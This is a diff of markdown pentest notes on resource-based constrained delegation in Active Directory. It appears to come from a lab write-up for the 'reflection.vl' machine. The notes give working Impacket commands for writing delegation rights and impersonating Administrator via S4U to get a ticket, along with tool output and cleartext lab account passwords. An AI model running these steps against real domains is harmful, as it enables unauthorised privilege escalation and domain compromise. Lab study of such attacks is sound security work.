@@ -69,9 +69,13 @@ sevenkingdoms\administrator
 
 ```bash
 addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip <dc_ip> '<domain>/<user>:<password>
+
 rbcd.py -delegate-from 'rbcd$' -delegate-to '<target_computer>' -dc-ip <dc_ip> -action 'write' '<domain>/<user>:<password>
+
 getST.py -spn 'cifs/<target_computer>.<domain>' -impersonate <target_user> -dc-ip <dc_ip> '<domain>/rbcd$:rbcdpass'
+
 export KRB5CCNAME=<target_user>.ccache
+
 wmiexec.py -k -no-pass <target_computer>.<domain>
 ```
 
@@ -102,4 +106,43 @@ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentL
 
 #Clean up
 Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+RBCD is also possible from an account associated with an `SPN`, if we know its password.
+
+RBCD cannot delegated from a `normal` user account. Only an `SPN` account or a `computer account`.
+
+![[Pasted image 20250607143148.png]]
+
+`SPN Account`: svc_web_staging
+`SPN Account Password`: DivinelyPacifism98
+
+```bash
+rbcd.py -delegate-from 'svc_web_staging' -delegate-to 'ws01$' -dc-ip 10.10.160.101 -action 'write' 'reflection.vl/Georgia.Price:DBl+5MPkpJg5id'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Accounts allowed to act on behalf of other identity:
+[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
+[*] Delegation rights modified successfully!
+[*] svc_web_staging can now impersonate users on ws01$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
+[*]     svc_web_staging   (S-1-5-21-3375389138-1770791787-1490854311-1119)
+```
+
+```bash
+getST.py -spn 'cifs/ws01.reflection.vl' -impersonate Administrator -dc-ip 10.10.160.101 'reflection.vl/svc_web_staging:DivinelyPacifism98'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+
+```bash
+export KRB5CCNAME=Administrator.ccache
 ```
